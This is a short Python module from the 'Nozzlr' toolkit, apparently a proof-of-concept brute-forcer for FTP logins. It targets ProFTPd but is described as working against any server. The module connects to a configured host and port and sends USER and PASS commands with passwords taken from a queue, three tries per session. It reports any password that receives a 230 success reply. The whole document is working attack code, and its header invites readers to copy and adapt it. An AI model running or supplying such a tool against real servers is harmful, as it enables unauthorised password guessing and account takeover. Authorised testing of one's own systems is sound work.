## Nozzlr module : FTP login - RAW FTP bruteforcer (PoC: ProFTPd but works w/ any other server)
# @author intrd - http://dann.com.br/ 
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

# Make a copy of this module and adapt to your task!

import sys, time
sys.path.append("libs/")
from int_netcat import Netcat

def nozz_module(payload,self=False):
	## Configs
	user="username"
	hostt="192.168.0.106"
	portt=21
	timeeou=5
	tries_per_session=3 #otimized for ProFTPD

	## Engine
	out={}
	out["code"]=""
	out["result"]=""
	try:
		nc = Netcat(hostt, portt, timeeou)
		data=nc.read()
	except Exception as e:
		out["result"]="error: connection timeout"
		out["code"]=format(str(e)).strip()
		return out
	out["result"]+=" "+data.strip()
	fresh=True
	for i in range(tries_per_session): 
		nc.write("USER "+user+'\n')
		try:
			data=nc.read_until(user)
		except Exception as e: 
			out["code"]=format(str(e)).strip()
			nc.close()
			return out
		out["result"]+=" "+data.strip()
		if not fresh:
			if self.queue.empty() is True:
				code="EOF"
				nc.close()
				out["code"]=code
				return out
			else:
				self.clear=self.queue.get()
			payload = self.clear.strip()
			payload = payload.split("|")
			ind = payload[0]
			payload = payload[1]
			out["result"]+=(" <"+ind+"> '"+payload+"'")
		nc.write("PASS "+payload+"\n")
		try:
			data=nc.read()
		except Exception as e: 
			code="error: sending passwd"
			out["code"]=code
			return out
		out["result"]+=" "+data.strip()
		if "230" in data:
			code="found: \""+payload+"\""
			nc.close()
			out["code"]=code
			return out
		if "530" not in data:
			code="error: unknown error"
			out["code"]=code
			return out
		fresh=False
	nc.close()
	code="NEXT"
	out["code"]=code
	return out
	
		